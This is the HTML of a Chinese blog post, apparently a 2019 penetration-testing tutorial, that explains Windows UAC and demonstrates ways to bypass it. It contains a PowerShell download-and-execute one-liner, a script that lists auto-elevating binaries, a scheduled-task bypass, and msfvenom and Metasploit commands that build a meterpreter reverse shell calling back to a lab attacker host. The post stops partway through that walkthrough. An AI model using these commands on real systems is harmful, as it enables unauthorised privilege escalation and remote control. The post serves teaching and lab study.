@@ -1,0 +1,409 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>UAC与ByPass-UAC | sh1yan&#39;blog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  
+  <meta name="description" content="0x00 前言 用户账号控制（UAC），这机制自win7以来就一直存在了，同时因内网渗透需要，所以我就开始继续补坑（完善知识积累）了。 0x01 什么是UAC UAC 是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止">
+<meta name="keywords" content="UAC,ByPass-UAC">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UAC与ByPass-UAC">
+<meta property="og:url" content="sh1yan.top/2019/07/11/UAC-and-ByPass-UAC/index.html">
+<meta property="og:site_name" content="sh1yan&#39;blog">
+<meta property="og:description" content="0x00 前言 用户账号控制（UAC），这机制自win7以来就一直存在了，同时因内网渗透需要，所以我就开始继续补坑（完善知识积累）了。 0x01 什么是UAC UAC 是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\1.jpg">
+<meta property="og:image" content="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\2.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\3.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\4.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\5.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\6.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\7.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\8.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\9.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\10.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\11.png">
+<meta property="og:image" content="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\12.png">
+<meta property="og:updated_time" content="2019-07-11T09:43:47.614Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="UAC与ByPass-UAC">
+<meta name="twitter:description" content="0x00 前言 用户账号控制（UAC），这机制自win7以来就一直存在了，同时因内网渗透需要，所以我就开始继续补坑（完善知识积累）了。 0x01 什么是UAC UAC 是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止">
+<meta name="twitter:image" content="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\1.jpg">
+  
+    <link rel="alternative" href="/atom.xml" title="sh1yan&#39;blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link href="//fonts.googleapis.com/css?family=Inconsolata" rel="stylesheet" type="text/css">
+  <link rel="stylesheet" href="/css/style.css">
+  
+
+  
+
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="header-outer" class="outer">
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+          <a class="main-nav-link" href="/gossip">Gossip</a>
+        
+          <a class="main-nav-link" href="/yqlj">Links</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="sh1yan.top"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main"><article id="post-UAC-and-ByPass-UAC" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/07/11/UAC-and-ByPass-UAC/" class="article-date">
+  <time datetime="2019-07-11T14:50:55.000Z" itemprop="datePublished">2019-07-11</time>
+</a>
+
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/漏洞研究/">漏洞研究</a>
+  </div>
+
+
+  </div>
+  <div class="article-inner">
+    
+
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      UAC与ByPass-UAC
+    </h1>
+  
+
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <div class="article-sharing">
+  <ul>
+    <li>
+      <div class="fb-like" data-send="false" data-layout="button_count" data-show-faces="false" data-font="verdana" data-href="sh1yan.top/2019/07/11/UAC-and-ByPass-UAC/"></div>
+    </li>
+  </ul>
+</div>
+
+      
+      
+        
+        <p><strong>0x00 前言</strong></p>
+<p>用户账号控制（UAC），这机制自win7以来就一直存在了，同时因内网渗透需要，所以我就开始继续补坑（完善知识积累）了。</p>
+<p><strong>0x01 什么是UAC</strong></p>
+<p>UAC 是微软在 Windows Vista 以后版本引入的一种安全机制，通过 UAC，应用程序和任务可始终在非管理员帐户的安全上下文中运行，除非管理员特别授予管理员级别的系统访问权限。UAC 可以阻止未经授权的应用程序自动进行安装，并防止无意中更改系统设置。<br><a id="more"></a><br><strong>0x02 UAC机制流程</strong></p>
+<p>在Windows操作系统中，所有的资源都是有自己对应的ACL，而这个ACL列表里记录了哪个资源需要什么样的权限才能去操作和执行。在使用管理员组账号进行登录Windows操作系统，如果系统开启了UAC，在登录后，会生成两份访问令牌，一份是标准用户令牌，一份是管理员访问令牌。不过默认会已标准用户权限令牌来启动桌面进行等。而需要管理员权限才能操作的程序和设置，有的会在程序图标上，显示一个小盾牌，或者在触发后，就会弹出UAC认证。</p>
+<p><img src="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\1.jpg" alt></p>
+<p>我从微软官方手册下，截取了完整的流程图，如下图：</p>
+<p><img src="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\2.png" alt></p>
+<p>通过图中，可以看到具体的流程（感觉这图还是太简洁了，应该还有很内部的没展现出来）。</p>
+<p>1、启动进程→判断是否启动了UAC→启动→是否直接提升权限启动进行→是→使用管理员权限开启进程</p>
+<p>2、启动进程→判断是否启动了UAC→否→使用管理员权限开启进程</p>
+<p>3、启动进程→判断是否启动了UAC→启动→是否直接提升权限启动进行→否→是否需要提升权限来启动（有无小盾牌）→是→弹窗提示是否使用管理员权限开启进行→是→使用管理员权限开启进程</p>
+<p>4、启动进程→判断是否启动了UAC→启动→是否直接提升权限启动进行→否→是否需要提升权限来启动（有无小盾牌）→否→进程是否在UAC白名单中→是→（各种内部判断）→使用管理员权限开启进程</p>
+<p>5、……………………………….</p>
+<p>UAC目前共有四个等级：从不通知、普通通知、默认通知、始终通知。</p>
+<p>而我们接下来的测试处于“默认通知”等级，并且使用的管理组账号，如果是始终通知，那就没什么可bypass的了，当然也不一定。（如果非管理组时，在弹UAC则会要求，管理员的授权及密码。）</p>
+<p><strong>注</strong>：每个需要管理员访问令牌的应用程序必须提示管理员给予同意。 一种例外情况是父进程和子进程之间存在关系。 子进程会从父进程继承用户访问令牌。 但是，父进程和子进程必须具有相同的完整性级别。 Windows Server 2012 通过标记其完整性级别来保护的进程。 完整性级别是对信任的衡量。 “高”完整性应用程序执行修改系统数据的任务（如，磁盘分区应用程序），而“低”完整性应用程序则执行可能潜在损坏操作系统的任务（如，Web 浏览器）。 具有低完整性级别的应用程序无法修改具有高完整性级别的应用程序中的数据。 当标准用户尝试运行需要管理员访问令牌的应用程序时，UAC 会要求该用户提供有效的管理员凭据。</p>
+<p><strong>0x03 进程权限演示</strong></p>
+<p>环境：Windows10 管理员组账号登录</p>
+<p>工具：<a href="https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Get-TokenPrivs.ps1" target="_blank" rel="noopener">Get-TokenPrivs.ps1</a></p>
+<p>远程加载脚本测试：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -nop -exec bypass -c <span class="string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/csy9730/batch_misc/bd941b6fe8a26235da81501d787a8a79b0c02696/misc/powershell/code/misc/pwershell-suite/Get-TokenPrivs.ps1');Get-TokenPrivs -ProcID 7264</span></span><br></pre></td></tr></table></figure>
+<p><img src="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\3.png" alt></p>
+<p>本地加载脚本测试：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">E:\&gt;powershell –ep bypass</span><br><span class="line">Windows PowerShell</span><br><span class="line">版权所有 (C) Microsoft Corporation。保留所有权利。</span><br><span class="line"></span><br><span class="line">PS E:\&gt; <span class="built_in">Import-Module</span> ./Get-TokenPrivs.ps1</span><br><span class="line">PS E:\&gt; Get-TokenPrivs -ProcID <span class="number">15032</span></span><br></pre></td></tr></table></figure>
+<p><img src="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\4.png" alt></p>
+<p>提升权限后测试：</p>
+<p><img src="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\5.png" alt></p>
+<p>提升权限后，直接无权限查看该进行的一些权限。</p>
+<p><strong>0x04 将会触发UAC授权的操作</strong></p>
+<ol>
+<li>配置Windows Update</li>
+<li>增加或删除用户账户</li>
+<li>改变用户的账户类型</li>
+<li>改变UAC设置</li>
+<li>安装ActiveX</li>
+<li>安装或移除程序</li>
+<li>安装设备驱动程序</li>
+<li>设置家长控制</li>
+<li>将文件移动或复制到Program Files或Windows目录</li>
+<li>查看其他用户文件夹</li>
+</ol>
+<p>基本上，只要有涉及到访问系统磁盘的根目录（例如C:），访问Windows目录，Windows系统目录，ProgramFiles目录，访问Windows安全信息以及读写系统注册表（Registry）的程序访问动作，都会需要通过UAC的认证。</p>
+<p><strong>0x05 UAC的好处</strong></p>
+<p>它减少了使用提升权限运行的程序数量，因此有助于防止用户意外更改其系统设置，并有助于防止“恶意软件”获得系统范围的访问权限。当提升被拒绝时，恶意软件只能影响当前用户的数据。如果没有提升，恶意软件无法进行系统范围的更改或影响其他用户。</p>
+<p>对于托管环境，精心设计的UAC体验允许用户通过删除不必要的限制，在作为标准用户运行时提高工作效率。</p>
+<p>它使标准用户能够要求管理员授予他们在当前会话中执行管理任务的权限。</p>
+<p>对于家庭环境，它可以更好地控制家长对系统范围的更改，包括安装的软件。</p>
+<p><strong>0x06 如何开启UAC</strong></p>
+<p>1、win + r   弹出运行界面</p>
+<p>2、输入 msconfig</p>
+<p>3、工具→更改UAC设置→启动→拉直默认通知→确认</p>
+<p><img src="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\6.png" alt></p>
+<p>4、当然，如果不觉得麻烦的话，请直接拉至始终通知，安全可靠，还很烦。</p>
+<p><img src="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\7.png" alt></p>
+<p><strong>0x07 目前公开的bypass UAC技巧</strong></p>
+<ol>
+<li>白名单提权机制；如Wusa.exe Bypass UAC,infDefault.exe Bypass UAC,PkgMgr.exe Bypass UAC等</li>
+<li>DLL 劫持</li>
+<li>Windows 自身漏洞提权</li>
+<li>远程注入</li>
+<li>COM 接口技术</li>
+<li>计划任务</li>
+</ol>
+<p><strong>0x08 白名单提权–篇章</strong></p>
+<p>一般来说，存在在白名单的EXE，基本都是在 C:\Windows\System32\ 目录下。</p>
+<p>如果该软件的设置如<code>&lt;autoElevate&gt;true&lt;/autoElevate&gt;</code>时，则是在白名单中。</p>
+<p>关于如何查找，可以使用以下方法：</p>
+<p>下载Sigcheck，用于查看信息：<a href="https://docs.microsoft.com/zh-cn/sysinternals/downloads/" target="_blank" rel="noopener">下载地址</a></p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用方法：sigcheck.exe -m C:\Windows\System32\<span class="built_in">cmd</span>.exe</span><br></pre></td></tr></table></figure>
+<p>不过建议使用以下方法，更方便：</p>
+<p>1、把 sigcheck.exe 放置到 C:\Windows\System32\  目录下。</p>
+<p>2、使用如下脚本进行测试（<a href="https://payloads.online/archivers/2018-12-22/1#%E5%AF%BB%E6%89%BE%E8%87%AA%E5%8A%A8%E6%8F%90%E5%8D%87%E6%9D%83%E9%99%90%E7%9A%84%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F-sigcheckexe" target="_blank" rel="noopener">倾旋博客</a>拿来的）</p>
+<p>脚本名：findelevate.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Usage: findelevate.py C:\Windows\System32\</span></span><br><span class="line"><span class="comment"># Needs sigcheck.exe in path [https://technet.microsoft.com/en-us/sysinternals/bb897441.aspx]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> glob</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">	<span class="keyword">print</span> <span class="string">"Usage: findelevate.py &lt;PATH&gt;"</span></span><br><span class="line">	<span class="keyword">print</span> <span class="string">"Ex: Usage: findelevate.py C:\\Windows\\System32\\"</span></span><br><span class="line">	sys.exit()</span><br><span class="line">	</span><br><span class="line">d = sys.argv[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> (d.endswith(<span class="string">'\\'</span>)):</span><br><span class="line">	d = d+<span class="string">'\\'</span></span><br><span class="line"></span><br><span class="line">exefiles = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isdir(d):</span><br><span class="line">	exefiles =  glob.glob(d+<span class="string">'*.exe'</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> exe <span class="keyword">in</span> exefiles:</span><br><span class="line">	p = subprocess.Popen([<span class="string">'sigcheck'</span>, <span class="string">'-nobanner'</span>,<span class="string">'-m'</span>, exe],stdout=subprocess.PIPE,stderr=subprocess.PIPE)</span><br><span class="line">	out, err = p.communicate()</span><br><span class="line">	<span class="keyword">if</span> <span class="string">'true&lt;/autoElevate&gt;'</span> <span class="keyword">in</span> out: <span class="comment">#will check for xmlns autoelevate as well. Thanks @mynameisv_</span></span><br><span class="line">		<span class="keyword">print</span> exe.strip()</span><br><span class="line">		i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Found "</span> + str(i) + <span class="string">" executables with autoElevate set to true!"</span></span><br></pre></td></tr></table></figure>
+<p>效果如下：</p>
+<p><img src="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\8.png" alt></p>
+<p>抽其中一个查看以下程序信息：</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">shiyan</span>&gt;<span class="title">sigcheck.exe</span> -<span class="title">m</span> <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">System32</span>\<span class="title">BitLockerWizardElev.exe</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Sigcheck</span> <span class="title">v2</span>.72 - <span class="title">File</span> <span class="title">version</span> <span class="title">and</span> <span class="title">signature</span> <span class="title">viewer</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) 2004-2019 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">c</span>:\<span class="title">windows</span>\<span class="title">system32</span>\<span class="title">BitLockerWizardElev.exe</span>:</span></span><br><span class="line"><span class="function">        <span class="title">Verified</span>:       <span class="title">Signed</span></span></span><br><span class="line"><span class="function">        <span class="title">Signing</span> <span class="title">date</span>:   4:01 2019/6/8</span></span><br><span class="line"><span class="function">        <span class="title">Publisher</span>:      <span class="title">Microsoft</span> <span class="title">Windows</span></span></span><br><span class="line"><span class="function">        <span class="title">Company</span>:        <span class="title">Microsoft</span> <span class="title">Corporation</span></span></span><br><span class="line"><span class="function">        <span class="title">Description</span>:    <span class="title">BitLocker</span> <span class="title">Drive</span> <span class="title">Encryption</span> <span class="title">Wizard</span></span></span><br><span class="line"><span class="function">        <span class="title">Product</span>:        <span class="title">Microsoft</span>?<span class="title">Windows</span>?<span class="title">Operating</span> <span class="title">System</span></span></span><br><span class="line"><span class="function">        <span class="title">Prod</span> <span class="title">version</span>:   10.0.17763.1</span></span><br><span class="line"><span class="function">        <span class="title">File</span> <span class="title">version</span>:   10.0.17763.1 (<span class="title">WinBuild</span>.160101.0800)</span></span><br><span class="line"><span class="function">        <span class="title">MachineType</span>:    64-<span class="title">bit</span></span></span><br><span class="line"><span class="function">        <span class="title">Manifest</span>:</span></span><br><span class="line"><span class="function">&lt;?<span class="title">xml</span> <span class="title">version</span>='1.0' <span class="title">encoding</span>='<span class="title">utf</span>-8' <span class="title">standalone</span>='<span class="title">yes</span>'?&gt;</span></span><br><span class="line"><span class="function">&lt;!-- <span class="title">Copyright</span> (<span class="title">c</span>) <span class="title">Microsoft</span> <span class="title">Corporation</span> --&gt;</span></span><br><span class="line"><span class="function">&lt;<span class="title">assembly</span></span></span><br><span class="line"><span class="function">    <span class="title">xmlns</span>="<span class="title">urn:schemas</span>-<span class="title">microsoft</span>-<span class="title">com:asm</span>.<span class="title">v1</span>"</span></span><br><span class="line"><span class="function">    <span class="title">manifestVersion</span>="1.0"</span></span><br><span class="line"><span class="function">    ......</span></span><br><span class="line"><span class="function">    &lt;<span class="title">windowsSettings</span>&gt;</span></span><br><span class="line"><span class="function">      &lt;<span class="title">dpiAware</span> <span class="title">xmlns</span>="<span class="title">http</span>://<span class="title">schemas.microsoft.com</span>/<span class="title">SMI</span>/2005/<span class="title">WindowsSettings</span>"&gt;<span class="title">true</span>&lt;/<span class="title">dpiAware</span>&gt;</span></span><br><span class="line"><span class="function">      &lt;<span class="title">autoElevate</span> <span class="title">xmlns</span>="<span class="title">http</span>://<span class="title">schemas.microsoft.com</span>/<span class="title">SMI</span>/2005/<span class="title">WindowsSettings</span>"&gt;<span class="title">true</span>&lt;/<span class="title">autoElevate</span>&gt;</span></span><br><span class="line"><span class="function">    &lt;/<span class="title">windowsSettings</span>&gt;</span></span><br><span class="line"><span class="function">  &lt;/<span class="title">application</span>&gt;</span></span><br><span class="line"><span class="function">&lt;/<span class="title">assembly</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>白名单 bypassUAC 演示视频（这里直接借用<a href="https://payloads.online/archivers/2018-12-22/1#0x14-bypass-uac%E6%BC%94%E7%A4%BA---fodhelperexe" target="_blank" rel="noopener">倾旋的视频</a>了，懒的搞了）：</p>
+<video src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-22/bypass_uac.mp4" controls="controls" width="500px"><br>哎呀~ 换个浏览器试试吧！<br></video>
+
+<p>注：如果视频挂了的话，那就<a href="链接: https://pan.baidu.com/s/11IY-p-SsqpefF9SaKDd2mA 提取码: uh9j 复制这段内容后打开百度网盘手机App，操作更方便哦">挂了</a>。。。</p>
+<p><strong>0x09 计划任务绕过UAC–篇章</strong></p>
+<p>测试条件：当前用户必须可以访问图形界面</p>
+<p>1、在命令行输入计划任务</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SCHTASKS /Create /sc DAILY /TN bypass_uac /TR <span class="built_in">cmd</span>.exe /st <span class="number">18</span>:<span class="number">00</span> /sd <span class="number">2019</span>/<span class="number">07</span>/<span class="number">11</span> /ed <span class="number">2020</span>/<span class="number">07</span>/<span class="number">11</span></span><br></pre></td></tr></table></figure>
+<p><img src="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\9.png" alt></p>
+<p>2、win + r 打开运行命令，输入  taskschd.msc</p>
+<p>3、找见刚刚添加的任务计划，然后右键打开，选择属性。</p>
+<p><img src="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\10.png" alt></p>
+<p>4、如图设置即可，等到时间达到，自动执行高权限运行。</p>
+<p>5、设置过程不户触发UAC。</p>
+<p>注：但是好鸡肋啊，我都进了图形界面了，如果弹出UAC，我直接选择确认不就行了。。。</p>
+<p><strong>0x10 使用 msf 绕过 UAC–篇章</strong></p>
+<p>攻击机：kali-2017，root账号，192.168.43.8</p>
+<p>测试机：win2012，shiyan（管理组账号），64位，192.168.43.106</p>
+<p>1、首先生成一个反弹shell</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">8</span> LPORT=<span class="number">4444</span> -f exe -o x86_shell.exe</span><br><span class="line"></span><br><span class="line">root@kali2-<span class="number">2017</span>:/home# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">8</span> LPORT=<span class="number">4444</span> -f exe -o x86_shell.exe</span><br><span class="line">No encoder or badchars specified, outputting raw payload</span><br><span class="line">Payload size: <span class="number">341</span> bytes</span><br><span class="line">Final size of exe file: <span class="number">73802</span> bytes</span><br><span class="line">Saved as: x86_shell.exe</span><br></pre></td></tr></table></figure>
+<p>一般使用msfvenom生成Windows相关的反弹shell时，建议使用32位的木马，因为64是兼容32的，但是有时候，我们生成的64位木马，在64位系统上不一定兼容。</p>
+<p>2、载入监听模块，并执行</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali：~ msfconsole</span><br><span class="line">msf5 &gt; use exploit/multi/handler </span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lport <span class="number">4444</span></span><br><span class="line">lport =&gt; <span class="number">4444</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; <span class="built_in">set</span> lhost <span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">8</span></span><br><span class="line">lhost =&gt; <span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">8</span></span><br><span class="line">msf5 exploit(multi/handler) &gt; run</span><br></pre></td></tr></table></figure>
+<p>3、反弹shell放到测试机上，并执行。</p>
+<p>4、获取先当前账号信息，并尝试进行提权。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: WIN-<span class="number">2012</span>\shiyan</span><br><span class="line">meterpreter &gt; getsystem</span><br></pre></td></tr></table></figure>
+<p><img src="http:\\sh1yan.top\photo\UAC-and-ByPass-UAC\11.png" alt></p>
+<p>尝试自动提权失败。</p>
+<p>5、我们把该shell切换至后台。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">[*] Backgrounding session <span class="number">4</span>...</span><br><span class="line"></span><br><span class="line">msf5 exploit(multi/handler) &gt; sessions</span><br><span class="line"></span><br><span class="line">Active sessions</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">  Id  Name  <span class="built_in">Type</span>                     Information                 Connection</span><br><span class="line">  --  ----  ----                     -----------                 ----------</span><br><span class="line">  <span class="number">4</span>         meterpreter x86/windows  WIN-<span class="number">2012</span>\shiyan @ WIN-<span class="number">2012</span>  <span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">8</span>:<span class="number">4444</span> -&gt; <span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">106</span>:<span class="number">49165</span> (<span class="number">192</span>.<span class="number">168</span>.<span class="number">43</span>.<span class="number">106</span>)</span><br></pre></td></tr></table></figure>
+<p>6、尝试搜索 bypassuac 相关模块。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; search bypassuac</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                              Disclosure <span class="built_in">Date</span>  Rank       Check  Description</span><br><span class="line">   -  ----                                              ---------------  ----       -----  -----------</span><br><span class="line">   <span class="number">1</span>  exploit/windows/local/bypassuac                   <span class="number">2010</span>-<span class="number">12</span>-<span class="number">31</span>       excellent  No     Windows Escalate UAC Protection Bypass</span><br><span class="line">   <span class="number">2</span>  exploit/windows/local/bypassuac_comhijack         <span class="number">1900</span>-<span class="number">01</span>-<span class="number">01</span>       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)</span><br><span class="line">   <span class="number">3</span>  exploit/windows/local/bypassuac_eventvwr          <span class="number">2016</span>-<span class="number">08</span>-<span class="number">15</span>       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)</span><br><span class="line">   <span class="number">4</span>  exploit/windows/local/bypassuac_fodhelper         <span class="number">2017</span>-<span class="number">05</span>-<span class="number">12</span>       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)</span><br><span class="line">   <span class="number">5</span>  exploit/windows/local/bypassuac_injection         <span class="number">2010</span>-<span class="number">12</span>-<span class="number">31</span>       excellent  No     Windows Escalate UAC Protection Bypass (<span class="keyword">In</span> Memory Injection)</span><br><span class="line">   <span class="number">6</span>  exploit/windows/local/bypassuac_injection_winsxs  <span class="number">2017</span>-<span class="number">04</span>-<span class="number">06</span>       excellent  No     Windows Escalate UAC Protection Bypass (<span class="keyword">In</span> Memory Injection) abusing WinSXS</span><br><span class="line">   <span class="number">7</span>  exploit/windows/local/bypassuac_sluihijack        <span class="number">2018</span>-<span class="number">01</span>-<span class="number">15</span>       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)</span><br><span class="line">   <span class="number">8</span>  exploit/windows/local/bypassuac_vbs               <span class="number">2015</span>-<span class="number">08</span>-<span class="number">22</span>       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)</span><br></pre></td></tr></table></figure>
